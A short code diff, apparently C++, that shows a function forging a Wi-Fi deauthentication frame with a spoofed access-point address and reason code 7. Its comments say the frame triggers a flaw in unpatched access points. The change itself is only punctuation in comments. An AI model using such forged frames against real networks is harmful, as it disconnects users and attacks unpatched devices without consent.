@@ -27,9 +27,9 @@ using namespace chrono;
 static RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
     Dot11Deauthentication frame;
     frame.addr1(sta_mac); // DA = client
-    frame.addr2(ap_mac);  // SA = AP (forged) — triggers 2019-7 on unpatched AP
+    frame.addr2(ap_mac);  // SA = AP (forged) - triggers 2019-7 on unpatched AP
     frame.addr3(ap_mac);  // BSSID
-    frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA — required by sme_event_unprot_disconnect
+    frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA - required by sme_event_unprot_disconnect
 
     RadioTap rt;
     rt.inner_pdu(frame);
